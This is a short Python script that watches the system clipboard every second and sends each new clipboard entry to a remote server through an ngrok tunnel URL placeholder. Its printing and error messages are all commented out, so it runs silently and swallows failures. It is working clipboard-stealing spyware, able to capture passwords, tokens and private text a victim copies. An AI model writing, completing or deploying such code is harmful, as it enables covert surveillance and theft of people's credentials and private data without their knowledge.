import pyperclip
import time
import requests

SERVER_URL = 'YOUR_NGROK_HTTPS_URL/upload_clipboard'

def monitor_clipboard():
    last_text = ""
    while True:
        try:
            text = pyperclip.paste()
            if text != last_text:
                # print(f"Clipboard changed: {text[:30]}...")  # Commented out
                response = requests.post(SERVER_URL, json={'clipboard': text})
                # if response.status_code == 200: # Commented out
                    # print("Clipboard data sent successfully.") # Commented out
                # else: # Commented out
                    # print(f"Failed to send clipboard data. Status code: {response.status_code}") # Commented out
                last_text = text
            time.sleep(1)  # Check clipboard every second
        except Exception as e:
            # print(f"Clipboard monitoring error: {e}") # Commented out
            time.sleep(5)

if __name__ == "__main__":
    monitor_clipboard()
